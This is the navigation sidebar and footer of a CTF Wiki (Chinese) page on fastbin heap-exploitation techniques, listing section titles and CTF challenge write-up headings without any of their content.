<li class="toctree-l1 current"><a class="reference internal" href="index.html">堆利用</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="heap_overview.html">堆概述</a></li>
<li class="toctree-l2"><a class="reference internal" href="heap_structure.html">堆相关数据结构</a></li>
<li class="toctree-l2"><a class="reference internal" href="heap_implementation_details.html">深入理解堆的实现</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow_basic.html">堆溢出</a></li>
<li class="toctree-l2"><a class="reference internal" href="off_by_one.html">堆中的 Off-By-One</a></li>
<li class="toctree-l2"><a class="reference internal" href="unlink.html">Unlink</a></li>
<li class="toctree-l2"><a class="reference internal" href="use_after_free.html">Use After Free</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">Fastbin Attack</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id1">介绍</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id2">原理</a></li>
<li class="toctree-l3"><a class="reference internal" href="#fastbin-double-free">Fastbin Double Free</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id3">介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id4">演示</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id5">小总结</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#house-of-spirit">House Of Spirit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id6">介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id7">演示</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id8">小总结</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#alloc-to-stack">Alloc to Stack</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id9">介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id10">演示</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id11">小总结</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#arbitrary-alloc">Arbitrary Alloc</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id12">介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id13">演示</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id14">小总结</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#hack-lu-oreo">2014 hack.lu oreo</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id15">基本分析</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id16">基本功能</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id17">利用</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#ctf-search-engine">2015 9447 CTF : Search Engine</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id18">基本信息</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id19">基本功能</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id20">词语结构体</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id21">堆内存相关操作</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id22">漏洞</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id23">利用</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#id24">利用思路</a></li>
<li class="toctree-l5"><a class="reference internal" href="#libc">泄漏 libc 地址</a></li>
<li class="toctree-l5"><a class="reference internal" href="#fastbin">构造 fastbin 循环链表</a></li>
<li class="toctree-l5"><a class="reference internal" href="#malloc-hook-chunk">分配 malloc_hook 附近chunk</a></li>
<li class="toctree-l5"><a class="reference internal" href="#shell">shell</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#ctf-babyheap">2017 0ctf babyheap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id25">基本信息</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id26">基本功能</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id27">利用思路</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#id28">泄漏 libc 基地址</a></li>
<li class="toctree-l5"><a class="reference internal" href="#chunkmalloc-hook">分配chunk到malloc_hook附近</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id29">题目</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id30">参考文献</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="chunk_extend_shrink.html">Chunk Extend/Shrink</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_einherjar.html">House Of Einherjar</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_lore.html">House of Lore</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_force.html">House Of Force</a></li>
<li class="toctree-l2"><a class="reference internal" href="unsorted_bin_attack.html">Unsorted Bin Attack</a></li>
</ul>
</li>
</ul>
<p class="caption"><span class="caption-text">Executable</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../executable/elf/index.html">ELF文件</a></li>
</ul>
</div>
        </div>
      </div>
    
    
        <div class="sidebar-toggle-group no-js">
            
            <button class="sidebar-toggle" id="sidebar-hide" title="Hide the sidebar menu">
                 «
                <span class="show-for-small">hide menu</span>
                
            </button>
            <button class="sidebar-toggle" id="sidebar-show" title="Show the sidebar menu">
                
                <span class="show-for-small">menu</span>
                <span class="hide-for-small">sidebar</span>
                 »
            </button>
        </div>
    
      <div class="clearer"></div>
    </div>
    <div class="relbar-bottom">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             >toc</a></li>
        <li class="right" >
          <a href="chunk_extend_shrink.html" title="Chunk Extend/Shrink"
             >下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="use_after_free.html" title="Use After Free"
             >上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" >堆利用</a> &#187;</li> 
      </ul>
    </div>
    </div>

    <div class="footer" role="contentinfo">
        &#169; Copyright 2016-2017, CTF Wiki.
      由 <a href="http://sphinx-doc.org/">Sphinx</a> 1.6.7 创建。
    </div>
    <!-- cloud_sptheme 1.4 -->
  </body>
</html>